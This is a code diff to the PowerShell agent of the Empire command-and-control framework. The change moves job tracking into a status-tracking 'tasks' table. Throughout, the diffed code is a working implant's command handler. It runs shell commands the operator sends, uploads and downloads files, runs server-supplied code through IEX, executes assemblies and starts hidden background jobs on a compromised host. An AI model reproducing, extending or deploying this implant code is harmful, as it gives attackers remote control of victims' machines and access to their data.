@@ -102,6 +102,7 @@ function Invoke-Empire {
     $script:DefaultResponse = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($DefaultResponse));
     $script:Proxy = $ProxySettings;
     $script:CurrentListenerName = "";
+    $script:tasks = @{}
 
     # the currently active server
     $Script:ServerIndex = 0;
@@ -137,9 +138,6 @@ function Invoke-Empire {
         }
     }
 
-    # keep track of all background jobs
-    #   format: {'RandomJobName' : @{'Alias'=$RandName; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=$Job; 'Buffer'=$Buffer}, ... }
-    $Script:Jobs = @{};
     $Script:Downloads = @{};
     # the currently imported script held in memory
     $script:ImportedScript = '';
@@ -433,14 +431,12 @@ function Invoke-Empire {
 
     # takes a string representing a PowerShell script to run, build a new
     #   AppDomain and PowerShell runspace, and kick off the execution in the
-    #   new runspace/AppDomain asynchronously, storing the results in $Script:Jobs.
+    #   new runspace/AppDomain asynchronously, storing the results in $Script:tasks.
     function Start-AgentJob {
         param($ScriptString)
 
-        $RandName = -join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 6);
-
         # create our new AppDomain
-        $AppDomain = [AppDomain]::CreateDomain($RandName);
+        $AppDomain = [AppDomain]::CreateDomain($ResultID);
 
         # load the PowerShell dependency assemblies in the new runspace and instantiate a PS runspace
         $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create();
@@ -456,23 +452,40 @@ function Invoke-Empire {
         # kick off asynchronous execution
         $Job = $BeginInvoke.Invoke($PSHost, @(($Buffer -as $PSobjectCollectionType), ($Buffer -as $PSobjectCollectionType)));
 
-        $Script:Jobs[$RandName] = @{'Alias'=$RandName; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=$Job; 'Buffer'=$Buffer};
-        $RandName;
+        $Script:tasks[$ResultID] = @{
+            "result_id" = $ResultID
+            "packet_type" = $type
+            "status" = "running"
+            "thread" = $Job
+            "language" = $null
+            "powershell" = @{
+                "app_domain" = $AppDomain
+                "ps_host" = $PSHost
+                "buffer" = $Buffer
+                "ps_host_exec" = $null
+            }
+        }
+        $ResultID;
     }
 
     # returns $True if the specified job is completed, $False otherwise
     function Get-AgentJobCompleted {
         param($JobName)
-        if($Script:Jobs.ContainsKey($JobName)) {
-            $Script:Jobs[$JobName]['Job'].IsCompleted;
+        if ($script:tasks.ContainsKey($JobName)) {
+            $jobCompleted = $script:tasks[$JobName]['thread'].IsCompleted
+            if ($jobCompleted) {
+                $script:tasks[$JobName]['status'] = 'completed'
+            }
+            return $jobCompleted
         }
+        return $false
     }
 
     # reads any data from the output buffer preserved for the specified job
     function Receive-AgentJob {
         param($JobName)
-        if($Script:Jobs.ContainsKey($JobName)) {
-            $Script:Jobs[$JobName]['Buffer'].ReadAll();
+        if($script:tasks.ContainsKey($JobName)) {
+            $script:tasks[$JobName]['powershell']['buffer'].ReadAll();
         }
     }
 
@@ -480,14 +493,18 @@ function Invoke-Empire {
     #   tear down the appdomain, and remove the job from the internal cache
     function Stop-AgentJob {
         param($JobName)
-        if($Script:Jobs.ContainsKey($JobName)) {
+        if ($script:tasks.ContainsKey($JobName)) {
             # kill the PS host
-            $Null = $Script:Jobs[$JobName]['PSHost'].Stop();
+            $Null = $script:tasks[$JobName]['powershell']['ps_host'].Stop()
             # get results
-            $Script:Jobs[$JobName]['Buffer'].ReadAll();
+            $results = $script:tasks[$JobName]['powershell']['buffer'].ReadAll()
             # unload the app domain runner
-            $Null = [AppDomain]::Unload($Script:Jobs[$JobName]['AppDomain']);
-            $Script:Jobs.Remove($JobName);
+            $Null = [AppDomain]::Unload($script:tasks[$JobName]['powershell']['app_domain'])
+            # mark the job as stopped
+            $script:tasks[$JobName]['status'] = 'stopped'
+            # remove the job from the hashtable
+            $script:tasks.Remove($JobName)
+            return $results
         }
     }
 
@@ -801,8 +818,23 @@ function Invoke-Empire {
         param($type, $msg, $ResultID)
 
         try {
+            $script:tasks[$ResultID] = @{
+                "result_id" = $ResultID
+                "packet_type" = $type
+                "status" = "started"
+                "thread" = $null
+                "language" = $null
+                "powershell" = @{
+                    "app_domain" = $null
+                    "ps_host" = $null
+                    "buffer" = $null
+                    "ps_host_exec" = $null
+                }
+            }
+
             # sysinfo request
             if($type -eq 1) {
+                $script:tasks[$ResultID]['status'] = 'completed'
                 return Encode-Packet -type $type -data $(Get-Sysinfo) -ResultID $ResultID;
             }
             # agent exit
@@ -817,6 +849,7 @@ function Invoke-Empire {
             # set proxy chain
             elseif($type -eq 34) {
                 Encode-Packet -type 0 -data '[!] Proxy chain not implemented' -ResultID $ResultID;
+                $script:tasks[$ResultID]['status'] = 'unimplemented'
             }
 
             # shell command
@@ -833,6 +866,7 @@ function Invoke-Empire {
                     $cmdargs = $parts[1..$parts.length] -join " ";
                     Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd -cmdargs $cmdargs) -join "`n").trim() -ResultID $ResultID;
                 }
+                $script:tasks[$ResultID]['status'] = 'completed'
             }
             # file download
             elseif($type -eq 41) {
@@ -907,10 +941,12 @@ function Invoke-Empire {
                         } while($EncodedPart)
 
                         Encode-Packet -type 40 -data "[*] File download of $file completed" -ResultID $ResultID;
+                        $script:tasks[$ResultID]['status'] = 'completed'
                     }
                 }
                 catch {
                     Encode-Packet -type 0 -data '[!] File does not exist or cannot be accessed' -ResultID $ResultID;
+                    $script:tasks[$ResultID]['status'] = 'error'
                 }
             }
             # file upload
@@ -923,9 +959,11 @@ function Invoke-Empire {
                 try{
                     Set-Content -Path $filename -Value $Content -Encoding Byte -ErrorAction Stop -ErrorVariable error
                     Encode-Packet -type $type -data "[*] Upload of $fileName successful" -ResultID $ResultID;
+                    $script:tasks[$ResultID]['status'] = 'completed'
                 }
                 catch {
                     Encode-Packet -type 0 -data $error -ResultID $ResultID;
+                    $script:tasks[$ResultID]['status'] = 'error'
                 }
             }
             # directory list
@@ -961,6 +999,7 @@ function Invoke-Empire {
                     }
                 }
                 Encode-Packet -data $output -type $type -ResultID $ResultID;
+                $script:tasks[$ResultID]['status'] = 'completed'
             }
             elseif($type -eq 44){
                 try{
@@ -1027,16 +1066,28 @@ function Invoke-Empire {
                         $Results = $pipeOutput.ToString();
                     }
                     Encode-Packet -data $results -type 40 -ResultID $ResultID;
+                    $script:tasks[$ResultID]['status'] = 'completed'
                 }
                 catch {
                     Encode-Packet -type 0 -data '[!] Error while executing assembly' -ResultID $ResultID;
+                    $script:tasks[$ResultID]['status'] = 'error'
                 }
             }
 
             # return the currently running jobs
             elseif($type -eq 50) {
-                $Downloads = $Script:Jobs.Keys -join "`n";
-                Encode-Packet -data ("Running Jobs:`n$Downloads") -type $type -ResultID $ResultID;
+                # Filter the tasks and create a list of strings for each task
+                $taskLines = @("Task ID | Status")
+                $taskLines += "-" * 20
+                foreach ($task_id in $script:tasks.Keys) {
+                    $task_info = $script:tasks[$task_id]
+                    $taskLine = "$task_id | $($task_info.status)"
+                    $taskLines += $taskLine
+                }
+
+                $tasksOutput = $taskLines -join "`n"
+                Encode-Packet -data ("`n$tasksOutput") -type $type -ResultID $ResultID
+                $script:tasks[$ResultID]['status'] = 'completed'
             }
 
             # stop and remove a specific job if it's running
@@ -1051,20 +1102,24 @@ function Invoke-Empire {
                         Encode-Packet -type $type -data $($Results) -ResultID $JobResultID;
                     }
                     Encode-Packet -type 51 -data "Job $JobName killed." -ResultID $JobResultID;
+                    $script:tasks[$ResultID]['status'] = 'completed'
                 }
                 catch {
                     Encode-Packet -type 0 -data "[!] Error in stopping job: $JobName" -ResultID $JobResultID;
+                    $script:tasks[$ResultID]['status'] = 'error'
                 }
             }
 
             # socks proxy server
             elseif($type -eq 60) {
                 Encode-Packet -type 0 -data '[!] SOCKS server not implemented' -ResultID $ResultID;
+                $script:tasks[$ResultID]['status'] = 'unimplemented'
             }
 
             # socks proxy server data
             elseif($type -eq 61) {
                 Encode-Packet -type 0 -data '[!] SOCKS server data not implemented' -ResultID $ResultID;
+                $script:tasks[$ResultID]['status'] = 'unimplemented'
             }
 
             # dynamic code execution, wait for output, don't save output
@@ -1072,6 +1127,7 @@ function Invoke-Empire {
                 $ResultData = IEX $data;
                 if($ResultData) {
                     Encode-Packet -type $type -data $ResultData -ResultID $ResultID;
+                    $script:tasks[$ResultID]['status'] = 'completed'
                 }
             }
             # dynamic code execution, wait for output, save output
@@ -1081,8 +1137,8 @@ function Invoke-Empire {
                 $extension = $data.Substring(15,5);
                 $data = $data.Substring(20);
 
-                # send back the results
                 Encode-Packet -type $type -data ($prefix + $extension + (IEX $data)) -ResultID $ResultID;
+                $script:tasks[$ResultID]['status'] = 'completed'
             }
 
             # dynamic code execution, no wait, don't save output
@@ -1090,10 +1146,12 @@ function Invoke-Empire {
                 $jobID = Start-AgentJob $data;
                 $script:ResultIDs[$jobID]=$resultID;
                 Encode-Packet -type $type -data ("Job started: " + $jobID) -ResultID $ResultID;
+                $script:tasks[$ResultID]['status'] = 'completed'
             }
             # dynamic code execution, no wait, save output
             elseif($type -eq 111 -or $type -eq 113) {
                 Encode-Packet -type 0 -data '[!] Dynamic code execution, no wait, save output not implemented' -ResultID $ResultID;
+                $script:tasks[$ResultID]['status'] = 'unimplemented'
 
                 # Write-Host "'dynamic code execution, no wait, save output' not implemented!"
 
@@ -1111,6 +1169,7 @@ function Invoke-Empire {
                 # encrypt the script for storage
                 $script:ImportedScript = Encrypt-Bytes $Encoding.GetBytes($data);
                 Encode-Packet -type $type -data "script successfully saved in memory" -ResultID $ResultID;
+                $script:tasks[$ResultID]['status'] = 'completed'
             }
 
             # execute a function in the currently imported script
@@ -1121,6 +1180,7 @@ function Invoke-Empire {
                     $jobID = Start-AgentJob ([System.Text.Encoding]::UTF8.GetString($script) + "; $data");
                     $script:ResultIDs[$jobID]=$ResultID;
                     Encode-Packet -type $type -data ("Job started: " + $jobID) -ResultID $ResultID;
+                    $script:tasks[$ResultID]['status'] = 'running'
                 }
             }
 
@@ -1130,10 +1190,11 @@ function Invoke-Empire {
                     IEX $data
 
                     Encode-Packet -type $type -data "[+] Switched the current listener to: $CurrentListenerName" -ResultID $ResultID;
+                    $script:tasks[$ResultID]['status'] = 'completed'
                 }
                 catch {
-
                     Encode-Packet -type 0 -data ("[!] Unable to update agent comm methods: $_") -ResultID $ResultID;
+                    $script:tasks[$ResultID]['status'] = 'error'
                 }
             }
 
@@ -1142,14 +1203,17 @@ function Invoke-Empire {
                 $script:CurrentListenerName = $data;
 
                 Encode-Packet -type $type -data "[+] Updated the CurrentListenerName to: $CurrentListenerName" -ResultID $ResultID;
+                $script:tasks[$ResultID]['status'] = 'completed'
             }
 
             else{
                 Encode-Packet -type 0 -data "[!] invalid type: $type" -ResultID $ResultID;
+                $script:tasks[$ResultID]['status'] = 'error'
             }
         }
         catch [System.Exception] {
             Encode-Packet -type $type -data "[!] error running command: $_" -ResultID $ResultID;
+            $script:tasks[$ResultID]['status'] = 'error'
         }
     }
 
@@ -1216,7 +1280,7 @@ function Invoke-Empire {
             $Packets = $null;(& $GetTask);
 
             # get any job results and kill the jobs
-            ForEach($JobName in $Script:Jobs.Keys) {
+            ForEach($JobName in $script:tasks.Keys) {
                 $Results = Stop-AgentJob -JobName $JobName | fl | Out-String;
                 $JobResultID = $script:ResultIDs[$JobName];
                 $Packets += $(Encode-Packet -type 110 -data $($Results) -ResultID $JobResultID);
@@ -1289,19 +1353,18 @@ function Invoke-Empire {
 
         # poll running jobs, receive any data, and remove any completed jobs
         $JobResults = $Null;
-        ForEach($JobName in $Script:Jobs.Keys) {
-            $JobResultID = $script:ResultIDs[$JobName];
-            # check if the job is still running
-            if(Get-AgentJobCompleted -JobName $JobName) {
-                # the job has stopped, so receive results/cleanup
-                $Results = Stop-AgentJob -JobName $JobName | fl | Out-String;
-            }
-            else {
-                $Results = Receive-AgentJob -JobName $JobName | fl | Out-String;
-            }
+        $JobNames = $Script:tasks.Keys | ForEach-Object { $_ }
 
-            if($Results) {
-                $JobResults += $(Encode-Packet -type 110 -data $($Results) -ResultID $JobResultID);
+        ForEach($JobName in $JobNames) {
+            $JobResultID = $script:ResultIDs[$JobName]
+            if (Get-AgentJobCompleted -JobName $JobName) {
+                $Results = Stop-AgentJob -JobName $JobName | fl | Out-String
+            }
+            elseif ($script:tasks[$JobName]['status'] -eq 'running') {
+                $Results = Receive-AgentJob -JobName $JobName | fl | Out-String
+            }
+            if ($Results) {
+                $JobResults += $(Encode-Packet -type 110 -data $($Results) -ResultID $JobResultID)
             }
         }
 
